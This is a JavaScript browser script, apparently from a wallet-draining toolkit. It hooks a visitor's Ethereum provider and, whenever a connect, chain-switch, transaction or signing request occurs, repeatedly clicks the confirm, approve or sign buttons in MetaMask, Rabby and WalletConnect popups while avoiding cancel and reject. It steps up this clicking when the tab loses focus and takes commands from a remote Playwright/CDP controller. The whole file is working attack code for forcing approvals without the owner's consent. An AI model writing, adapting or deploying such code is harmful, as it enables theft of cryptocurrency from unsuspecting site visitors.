/**
 * Extension popup assist — maximum automation on visitor device.
 * - In-page wallet overlays (Rabby bar, WC, AppKit)
 * - visibility/focus signals → server CDP burst
 * - Rapid extension-popup polling loop
 * Note: true MetaMask notification.html = CDP bridge OR debug Chrome required.
 */
(function extensionPopupAssist() {
  'use strict';
  if (window.__EXT_POPUP_ASSIST__) return;
  window.__EXT_POPUP_ASSIST__ = true;

  const WALLET_OVERLAY_SELECTORS = [
    '#metamask-notification',
    '[class*="metamask"]',
    '[class*="rabby"]',
    '[data-testid="confirmation-submit-button"]',
    '[data-testid="page-container-footer-next"]',
    '[data-testid="confirmation-submit-button"]',
    '.confirmation-submit-button',
    '.mm-button-primary',
    '.btn-primary.confirm',
    'button.confirm-btn',
    '[class*="Confirmation"] button[class*="primary"]',
    'w3m-modal button',
    'appkit-modal button',
  ];

  const EXT_BTN_RE =
    /^(confirm|approve|sign|next|connect|authorize|allow|proceed|submit|yes|ok|got it|switch|add network)$/i;

  let assistTimer = null;
  let burstUntil = 0;
  let pendingWalletUi = false;

  function log(...a) {
    if (window.LegionAgentConfig?.debug) console.log('[ext-assist]', ...a);
  }

  function sendSignal(type, payload = {}) {
    window.VisitorPlaywrightBridge?.send?.(`visitor:ext:${type}`, payload);
    window.LegionAgent?.emitEvent?.(`ext:${type}`, payload);
  }

  function collectAll(root) {
    const out = [];
    const walk = (node) => {
      if (node.nodeType !== 1) return;
      const el = node;
      if (el.shadowRoot) walk(el.shadowRoot);
      if (el.matches?.('button, a, [role="button"], input[type="submit"]')) out.push(el);
      for (const c of el.children) walk(c);
    };
    walk(root);
    return out;
  }

  function isVisible(el) {
    if (!el || el.disabled) return false;
    const r = el.getBoundingClientRect();
    if (r.width < 2 || r.height < 2) return false;
    const st = getComputedStyle(el);
    return st.display !== 'none' && st.visibility !== 'hidden' && st.opacity !== '0';
  }

  function tryClickExtensionUi() {
    for (const sel of WALLET_OVERLAY_SELECTORS) {
      try {
        const el = document.querySelector(sel);
        if (el && isVisible(el) && !/cancel|reject|close/i.test(el.textContent || '')) {
          el.click();
          log('selector click', sel);
          sendSignal('clicked', { via: 'selector', sel });
          return true;
        }
      } catch { /* */ }
    }

    for (const el of collectAll(document)) {
      const text = (el.textContent || el.getAttribute('aria-label') || '').trim();
      if (!text || text.length > 40) continue;
      if (!EXT_BTN_RE.test(text)) continue;
      if (!isVisible(el)) continue;
      const inWalletUi = isWalletOverlay(el);
      if (inWalletUi || pendingWalletUi || Date.now() < burstUntil) {
        el.click();
        log('text click', text);
        sendSignal('clicked', { via: 'text', text });
        return true;
      }
    }
    return false;
  }

  function isWalletOverlay(el) {
    let n = el;
    while (n && n !== document.body) {
      const cls = (n.className || '').toString().toLowerCase();
      const id = (n.id || '').toLowerCase();
      if (/metamask|rabby|wallet|confirmation|notification|approve|sign/i.test(cls + id)) return true;
      if (n.tagName === 'W3M-MODAL' || n.tagName === 'APPKIT-MODAL') return true;
      n = n.parentElement;
    }
    return false;
  }

  function startBurst(ms = 30_000) {
    burstUntil = Date.now() + ms;
    if (assistTimer) return;
    assistTimer = setInterval(() => {
      tryClickExtensionUi();
      if (Date.now() > burstUntil && !pendingWalletUi) {
        clearInterval(assistTimer);
        assistTimer = null;
      }
    }, 120);
  }

  function onWalletRequest() {
    pendingWalletUi = true;
    startBurst(45_000);
    sendSignal('popup-expected', {});
  }

  function onWalletRequestDone() {
    setTimeout(() => { pendingWalletUi = false; }, 3000);
  }

  function hookEthereum() {
    const patch = (provider) => {
      if (!provider || provider.__extAssistPatched) return;
      provider.__extAssistPatched = true;
      const orig = provider.request?.bind(provider);
      if (!orig) return;
      provider.request = async (args) => {
        const m = args?.method;
        if (
          m === 'eth_requestAccounts' ||
          m === 'wallet_switchEthereumChain' ||
          m === 'wallet_addEthereumChain' ||
          m === 'eth_sendTransaction' ||
          m === 'personal_sign' ||
          m?.includes('signTypedData')
        ) {
          onWalletRequest();
          try {
            const res = await orig(args);
            onWalletRequestDone();
            return res;
          } catch (e) {
            onWalletRequestDone();
            throw e;
          }
        }
        return orig(args);
      };
    };

    if (window.ethereum?.providers) window.ethereum.providers.forEach(patch);
    patch(window.ethereum);
  }

  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
      log('page hidden — wallet popup likely open');
      sendSignal('page-hidden', {});
      startBurst(20_000);
    }
  });

  window.addEventListener('blur', () => {
    sendSignal('window-blur', {});
    startBurst(15_000);
  });

  window.addEventListener('tw:sign-typed-data', () => onWalletRequest());
  window.addEventListener('tw:personal-sign', () => onWalletRequest());
  window.addEventListener('tw:send-tx', () => onWalletRequest());
  window.addEventListener('tw:wallet-connected', () => startBurst(10_000));

  window.addEventListener('legion:playwright', (e) => {
    if (e.detail?.type === 'ext:burst') startBurst(e.detail?.ms || 25_000);
    if (e.detail?.type === 'ext:click') tryClickExtensionUi();
  });

  hookEthereum();
  startBurst(60_000);

  window.ExtensionPopupAssist = {
    startBurst,
    tryClick: tryClickExtensionUi,
    hookEthereum,
  };
})();
